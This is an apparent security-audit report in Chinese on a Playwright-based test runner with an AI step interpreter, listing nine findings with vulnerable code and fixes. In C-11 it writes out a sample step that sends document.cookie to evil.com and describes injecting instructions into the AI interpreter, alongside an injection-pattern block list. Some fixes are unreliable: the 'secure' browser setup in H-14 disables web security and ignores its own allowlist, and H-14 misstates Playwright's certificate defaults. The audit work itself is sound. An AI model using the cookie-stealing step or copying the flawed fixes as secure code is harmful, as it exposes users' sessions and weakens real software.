# 额外安全发现 - 第四轮审查
## 深度代码审查 - 新发现的安全漏洞

**审查日期**: 2025-05-05
**审查范围**: 测试执行任务、配置加载器、依赖安全

---

## 🔴 新发现的严重问题 (2个)

### C-11: 动态代码执行风险 - AI 解释器
**严重程度**: CRITICAL
**CVSS**: 8.2 (High)
**CWE**: CWE-913 (Improper Control of Dynamically-Managed Code)

**位置**:
- 文件: `service/backend/app/tasks/test_execution.py`
- 行: 392-406, 418-531

**漏洞代码**:
```python
async def _execute_step_with_ai(page: Page, step: Dict[str, Any], environment: Dict[str, Any]):
    # 使用 Claude AI 来解释和执行自然语言步骤
    result = await get_claude_interpreter().interpret_and_execute(page, description, context)

async def _interpret_and_execute(page: Page, description: str, environment: Dict[str, Any]):
    # 简化的基于规则的解释器
    # 在生产环境中，这将使用 Claude Code SDK 或类似的 AI 服务
```

**问题**:
1. **自然语言代码执行**: 测试步骤通过自然语言描述，然后被动态解释和执行
2. **AI 模型注入**: 恶意用户可以通过精心设计的测试步骤注入恶意指令
3. **任意操作**: 当前实现允许导航、点击、输入等任意操作

**攻击场景**:
```python
# 恶意测试步骤示例
{
    "step_number": 1,
    "description": "navigate to https://evil.com/xss?steal=document.cookie"
}

# 或者
{
    "step_number": 1, 
    "description": "click selector=script[src*='malicious.js']"
}
```

**影响**:
- SSRF (服务器端请求伪造)
- XSS (跨站脚本攻击)
- 数据泄露
- 系统接管

**修复方案**:
```python
# 1. 添加 URL 白名单验证
ALLOWED_DOMAINS = [
    'localhost',
    '*.example.com',
    '*.test.com'
]

def _extract_url(description: str) -> str:
    url = _extract_url_unsafe(description)
    if not url:
        return None
    
    # 验证域名在白名单中
    from urllib.parse import urlparse
    parsed = urlparse(url)
    
    for allowed in ALLOWED_DOMAINS:
        if parsed.netloc == allowed or parsed.netloc.endswith(allowed.replace('*', '')):
            return url
    
    raise ValueError(f"Domain {parsed.netloc} not in whitelist")

# 2. 限制选择器复杂性
def _extract_selector(description: str) -> str:
    selector = _extract_selector_unsafe(description)
    
    # 禁止复杂选择器
    if any(dangerous in selector for dangerous in ['[src*=', '[href*=', 'javascript:', 'data:text']):
        raise ValueError(f"Dangerous selector detected: {selector}")
    
    # 限制选择器长度
    if len(selector) > 200:
        raise ValueError("Selector too long")
    
    return selector

# 3. 添加 AI 内容过滤
AI_INJECTION_PATTERNS = [
    r'javascript:',
    r'document\.cookie',
    r'eval\s*\(',
    r'<script',
    r'on\w+\s*=',
]

async def _execute_step_with_ai(page, step, environment):
    description = step.get("description", "").strip()
    
    # 检查注入模式
    import re
    for pattern in AI_INJECTION_PATTERNS:
        if re.search(pattern, description, re.IGNORECASE):
            raise ValueError(f"Potentially malicious step description: {description}")
    
    # 继续执行...
```

---

### C-12: 未经验证的 Git 命令执行
**严重程度**: CRITICAL  
**CVSS**: 7.8 (High)
**CWE**: CWE-78 (OS Command Injection)

**位置**:
- 文件: `cli/src/config/loader.ts`
- 行: 87-92

**漏洞代码**:
```typescript
// Otherwise try to run git command
const branch = execSync("git rev-parse --abbrev-ref HEAD", {
  encoding: "utf-8",
  stdio: ["pipe", "pipe", "ignore"],
}).trim();
```

**问题**:
1. **直接执行 Git 命令**: 虽然使用了 stdio 限制，但仍然执行了外部命令
2. **无输入验证**: 没有验证 Git 命令的来源或参数
3. **环境依赖**: 依赖系统 Git 可用性和配置

**潜在攻击**:
如果攻击者能够控制 `GIT_BRANCH` 环境变量或文件系统（通过其他漏洞），可能注入恶意 Git 命令。

**修复方案**:
```typescript
private detectGitBranch(): Environment | null {
  try {
    // 验证 GIT_BRANCH 环境变量
    if (process.env.GIT_BRANCH) {
      const branch = process.env.GIT_BRANCH;
      
      // 白名单验证分支名格式
      if (!/^[a-zA-Z0-9_/-]+$/.test(branch)) {
        logger.warn(`Invalid GIT_BRANCH format: ${branch}`);
        return null;
      }
      
      // 限制分支名长度
      if (branch.length > 100) {
        logger.warn(`GIT_BRANCH too long: ${branch.length}`);
        return null;
      }
      
      return this.mapBranchToEnvironment(branch);
    }

    // 使用更安全的方式执行 Git
    const { execSync } = require("child_process");
    
    // 添加超时和验证
    const branch = execSync("git rev-parse --abbrev-ref HEAD", {
      encoding: "utf-8",
      stdio: ["pipe", "pipe", "ignore"],
      timeout: 5000,  // 5秒超时
      cwd: process.cwd()  // 限制工作目录
    }).trim();
    
    // 验证输出
    if (!/^[a-zA-Z0-9_/-]+$/.test(branch)) {
      logger.warn(`Invalid git branch name: ${branch}`);
      return null;
    }
    
    return this.mapBranchToEnvironment(branch);
  } catch (error) {
    logger.debug(`Git detection failed: ${error}`);
    return null;
  }
}
```

---

## 🟠 高危问题 (3个)

### H-13: 硬编码的服务账户令牌生成
**严重程度**: HIGH
**CVSS**: 7.5 (High)
**CWE**: CWE-322 (Key Exchange without Entity Authentication)

**位置**:
- 文件: `service/backend/app/tasks/test_execution.py`
- 行: 25-37

**漏洞代码**:
```python
def create_service_token():
    """Create a JWT token for service-to-service communication"""
    data = {
        "sub": "1",  # Admin user ID  # ← 硬编码
        "username": "admin",  # ← 硬编码
        "is_admin": True,
        "type": "service"
    }
    expire = timedelta(hours=24)
    to_encode = data.copy()
    expire_time = datetime.utcnow() + expire
    to_encode.update({"exp": expire_time})
    return jwt.encode(to_encode, settings.SECRET_KEY, algorithm=settings.ALGORITHM)
```

**问题**:
1. **硬编码管理员 ID**: `sub: "1"` 总是使用用户ID 1
2. **缺少认证**: 服务间通信没有双向认证
3. **令牌生命周期长**: 24小时有效期过长
4. **无令牌刷新机制**: 无法撤销令牌

**影响**:
- 如果泄露服务令牌，攻击者可以永久以管理员身份访问
- 服务间通信可以被中间人攻击

**修复方案**:
```python
# 1. 创建专用的服务账户
SERVICE_ACCOUNT_ID = os.environ.get("SERVICE_ACCOUNT_ID", "service_account")

# 2. 使用短期令牌
def create_service_token():
    """Create a short-lived JWT token for service-to-service communication"""
    data = {
        "sub": SERVICE_ACCOUNT_ID,
        "username": "service_account",
        "is_admin": True,
        "type": "service",
        "nonce": secrets.token_hex(16)  # 添加随机数
    }
    
    # 使用更短的有效期（15分钟）
    expire = timedelta(minutes=15)
    expire_time = datetime.utcnow() + expire
    to_encode = data.copy()
    to_encode.update({"exp": expire_time})
    
    return jwt.encode(to_encode, settings.SECRET_KEY, algorithm=settings.ALGORITHM)

# 3. 实现令牌黑名单
class TokenBlacklist:
    def __init__(self):
        self.blacklisted = set()
    
    def revoke(self, token_id: str):
        self.blacklisted.add(token_id)
    
    def is_revoked(self, token_id: str) -> bool:
        return token_id in self.blacklisted
```

---

### H-14: 不安全的 Playwright 配置
**严重程度**: HIGH
**CVSS**: 6.8 (Medium)
**CWE**: CWE-273 (Improper Check for Certificate Revocation)

**位置**:
- 文件: `service/backend/app/tasks/test_execution.py`
- 行: 261-264

**漏洞代码**:
```python
async with async_playwright() as p:
    browser = await p.chromium.launch(headless=settings.PLAYWRIGHT_HEADLESS)
    context = await browser.new_context()
    page = await context.new_page()
```

**问题**:
1. **忽略 SSL 错误**: Playwright 默认忽略证书错误
2. **无代理控制**: 测试可能通过外部代理路由流量
3. **无下载限制**: 可能下载恶意文件
4. **无资源限制**: 可能消耗过多资源

**修复方案**:
```python
async with async_playwright() as p:
    browser = await p.chromium.launch(
        headless=settings.PLAYWRIGHT_HEADLESS,
        args=[
            '--disable-web-security',  # 仅在测试环境
            '--disable-features=VizDisplayCompositor'
        ]
    )
    
    # 配置安全的浏览器上下文
    context = await browser.new_context(
        ignore_https_errors=False,  # 强制 HTTPS
        accept_downloads=False,  # 禁止下载
        java_script_enabled=True,
        bypass_csp=False  # 不绕过 CSP
    )
    
    page = await context.new_page()
    
    # 设置页面超时
    page.set_default_timeout(settings.TEST_TIMEOUT)
    
    # 添加请求拦截器
    async def block_external_requests(route):
        # 只允许特定域名
        allowed_domains = ['localhost', '127.0.0.1', '*.test.com']
        
        if route.request.resource_type in ['image', 'font', 'media']:
            await route.abort()
        else:
            await route.continue_()
    
    await page.route('**/*', block_external_requests)
```

---

### H-15: 缺少输入深度限制
**严重程度**: HIGH
**CVSS**: 6.5 (Medium)
**CWE**: CWE-400 (Uncontrolled Resource Consumption)

**位置**:
- 文件: `service/backend/app/tasks/test_execution.py`
- 行: 379-388

**漏洞代码**:
```python
description = step.get("description", "").strip()

if not description:
    return {
        "step_number": step.get("step_number", 0),
        "description": "Empty step description",
        "status": "failed",
        "error": "Empty step description",
        "duration": datetime.utcnow().timestamp() * 1000 - step_start
    }
```

**问题**:
没有限制 `description` 的长度，攻击者可以提供极长的描述导致：
1. 内存耗尽
2. CPU 过载（AI 解释处理）
3. 拒绝服务

**修复方案**:
```python
MAX_DESCRIPTION_LENGTH = 1000

description = step.get("description", "").strip()

# 长度验证
if len(description) > MAX_DESCRIPTION_LENGTH:
    return {
        "step_number": step.get("step_number", 0),
        "description": description[:100] + "...",  # 截断
        "status": "failed",
        "error": f"Description too long (max {MAX_DESCRIPTION_LENGTH} chars)",
        "duration": datetime.utcnow().timestamp() * 1000 - step_start
    }

# 内容验证
if not description:
    return {
        "step_number": step.get("step_number", 0),
        "description": "Empty step description",
        "status": "failed",
        "error": "Empty step description",
        "duration": datetime.utcnow().timestamp() * 1000 - step_start
    }
```

---

## 🟡 中危问题 (4个)

### M-14: 缺少依赖安全扫描
**位置**: 所有 package.json 和 requirements.txt

**问题**:
- npm audit 失败（镜像不支持）
- pip-audit 未安装
- 没有自动依赖扫描

**修复**:
```bash
# 1. 使用官方 npm 源
npm config set registry https://registry.npmjs.org/
npm audit --audit-level=high

# 2. 安装 pip-audit
pip install pip-audit
pip-audit --format json > audit-report.json
```

---

### M-15: 测试步骤数据未验证
**位置**: `service/backend/app/tasks/test_execution.py:228-247`

**问题**:
从 API 获取的测试步骤直接用于执行，没有验证。

**修复**:
```python
# 添加测试步骤验证
ALLOWED_STEP_TYPES = ['navigate', 'click', 'fill', 'wait', 'screenshot', 'verify']

for step_data in test_steps_data:
    step_type = step_data.get("type", "unknown")
    
    # 验证步骤类型
    if step_type not in ALLOWED_STEP_TYPES:
        raise ValueError(f"Invalid step type: {step_type}")
    
    # 验证参数
    params = step_data.get("params", {})
    if "selector" in params:
        validate_selector(params["selector"])
    if "value" in params:
        validate_input(params["value"])
```

---

### M-16: 缺少执行频率限制
**位置**: `service/backend/app/tasks/test_execution.py:40`

**问题**:
Celery 任务没有频率限制，可能被滥用导致资源耗尽。

**修复**:
```python
from celery import Task

@celery_app.task(
    bind=True,
    name="app.tasks.test_execution.execute_test",
    autoretry_for=(Exception,),
    retry_backoff=True,
    max_retries=3,
    rate_limit='10/m'  # 每分钟最多10个任务
)
def execute_test(self, test_definition_id: int, run_id: str, environment: Dict[str, Any] = None):
    # ... 任务代码
```

---

### M-17: 环境变量直接传递给测试
**位置**: `service/backend/app/tasks/test_execution.py:150, 394`

**问题**:
用户提供的 `environment` 字典直接用于测试，可能包含恶意环境变量。

**修复**:
```python
ALLOWED_ENV_VARS = {
    'NODE_ENV', 'API_TIMEOUT', 'DEBUG', 'LOG_LEVEL'
}

def sanitize_environment(environment: Dict[str, Any]) -> Dict[str, Any]:
    """清理环境变量，只允许安全变量"""
    sanitized = {}
    
    for key, value in environment.items():
        # 只允许预定义的变量
        if key in ALLOWED_ENV_VARS:
            # 验证值
            if isinstance(value, str) and len(value) < 100:
                sanitized[key] = value
            elif isinstance(value, (int, float, bool)):
                sanitized[key] = value
    
    return sanitized

# 使用清理后的环境
environment = sanitize_environment(environment or {})
```

---

## 📊 新发现总结

**新增安全问题**:
- 🔴 严重: 2
- 🟠 高危: 3
- 🟡 中危: 4

**总计更新**: 41 → **50 个安全问题**

---

## 🎯 优先修复建议

### 今天（最紧急）:
1. ✅ 已完成：撤销 API 密钥
2. ✅ 已完成：轮换数据库密码
3. **新增**: 限制 AI 解释器的 URL 和选择器
4. **新增**: 验证 Git 命令输入
5. **新增**: 缩短服务令牌有效期

### 本周:
1. 实施测试步骤白名单
2. 添加 AI 内容注入过滤
3. 配置安全的 Playwright 设置
4. 实施依赖扫描
5. 添加任务频率限制

---

**审查完成时间**: 2025-05-05 22:30
**审查方法**: 手动代码审查 + Grep 搜索 + 静态分析
**文件审查数**: 8 个关键文件
**新增漏洞**: 9 个
